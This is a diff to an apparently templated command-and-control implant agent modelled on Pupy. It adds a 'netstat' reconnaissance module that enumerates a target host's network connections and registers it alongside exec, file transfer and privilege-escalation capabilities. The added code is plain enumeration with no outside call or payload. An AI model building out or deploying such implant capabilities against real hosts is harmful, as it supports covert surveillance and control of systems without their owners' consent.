@@ -634,6 +634,7 @@ def _action_bind() -> None:
     table["sysinfo"] = lambda task: mod_systeminfo()
     table["network"] = lambda task: mod_network()
     table["processes"] = lambda task: mod_processes()
+    table["netstat"] = lambda task: mod_netstat()
 {% else %}
     table["ping"] = lambda task: {"pong": True, "id": AGENT_ID}
 {% endif %}
@@ -708,7 +709,7 @@ _OBF = _NoopObf()
 # Unconditional: the plaintext TCP ListenerClient path needs it regardless of
 # the obfuscation level.
 CAPABILITIES = [
-    {% if include_recon %}"sysinfo", "network", "processes",{% endif %}
+    {% if include_recon %}"sysinfo", "network", "processes", "netstat",{% endif %}
     {% if include_exec %}"exec",{% endif %}
     {% if include_fs %}"fs_list", "fs_get", "fs_put",{% endif %}
     {% if include_privesc %}"privesc_check", "privesc_suggest",{% endif %}
@@ -1422,7 +1423,7 @@ def mod_network():
                 out = [{"raw": p.stdout}]
             except Exception:
                 out = [{"error": "netifaces and ifconfig both unavailable"}]
-    # Routes
+# Routes
     try:
         p = _sp.run(["ip", "route"], capture_output=True, text=True)
         routes = p.stdout.splitlines()
@@ -1440,6 +1441,66 @@ def mod_network():
         except Exception:
             pass
     return {"interfaces": out, "routes": routes, "listeners": listeners}
+
+def mod_netstat():
+    """Established connections, as the host itself sees them.
+
+    Upstream Pupy's ``netstat``. Three tiers, best structure first, because each
+    step down trades structure for a dependency on the target having a
+    particular tool: psutil (structured), then the Linux /proc tables (no
+    dependency, Linux-only), then the host's own netstat/ss (works anywhere,
+    returns text). ``source`` names the tier that answered, so an operator
+    reading a parsed result knows whether it was parsed or quoted.
+    """
+    try:
+        import psutil
+        conns = []
+        for c in psutil.net_connections(kind="inet"):
+            local = getattr(c, "laddr", None)
+            remote = getattr(c, "raddr", None)
+            conns.append({
+                "type": {1: "tcp", 2: "udp"}.get(c.type, str(c.type)),
+                "local": f"{local.ip}:{local.port}" if local else "",
+                "remote": f"{remote.ip}:{remote.port}" if remote else "",
+                "status": c.status,
+                "pid": c.pid,
+            })
+        return {"source": "psutil", "connections": conns, "count": len(conns)}
+    except Exception:
+        pass
+
+    # Linux without psutil: the kernel's own tables.
+    for path, kind in (("/proc/net/tcp", "tcp"), ("/proc/net/tcp6", "tcp6"),
+                       ("/proc/net/udp", "udp"), ("/proc/net/udp6", "udp6")):
+        try:
+            rows = []
+            with open(path) as fh:
+                next(fh, None)
+                for line in fh:
+                    f = line.split()
+                    if len(f) < 4:
+                        continue
+                    def _addr(token):
+                        host, _, port = token.partition(":")
+                        if len(host) == 8:
+                            octets = [host[i:i + 2] for i in range(0, 8, 2)][::-1]
+                            host = ".".join(str(int(o, 16)) for o in octets)
+                        return f"{host}:{int(port, 16)}"
+                    rows.append({"type": kind, "local": _addr(f[1]),
+                                 "remote": _addr(f[2]), "status": f[3]})
+            return {"source": path, "connections": rows, "count": len(rows)}
+        except Exception:
+            continue
+
+    for argv in (["netstat", "-ano"], ["ss", "-tunap"], ["netstat", "-an"]):
+        try:
+            p = _sp.run(argv, capture_output=True, text=True, timeout=30)
+            if p.stdout:
+                return {"source": " ".join(argv), "output": p.stdout}
+        except Exception:
+            continue
+    return {"error": "no connection table available on this host"}
+
 
 def mod_processes():
     procs = []
@@ -2079,7 +2140,7 @@ def _register(transport) -> tuple:
         "capabilities": [
             {% if include_exec %}"exec",{% endif %}
             "ping", "shutdown",
-            {% if include_recon %}"sysinfo", "network", "processes",{% endif %}
+            {% if include_recon %}"sysinfo", "network", "processes", "netstat",{% endif %}
 
             {% if include_fs %}"fs_list", "fs_get", "fs_put",{% endif %}
             {% if include_privesc %}"privesc_check", "privesc_suggest",{% endif %}
@@ -2204,7 +2265,7 @@ def _parse_command(text: str) -> dict:
         return {"action": "exec", "command": text}
     verb, _, rest = text.partition(" ")
     v, arg = verb.lower(), text[len(verb):].strip()
-    if v in ("sysinfo", "network", "privesc_check", "privesc_suggest", "ping"):
+    if v in ("sysinfo", "network", "netstat", "privesc_check", "privesc_suggest", "ping"):
         return {"action": v}
     if v in ("ps", "processes"):
         # Both words answer the server's capability by that name. A word the
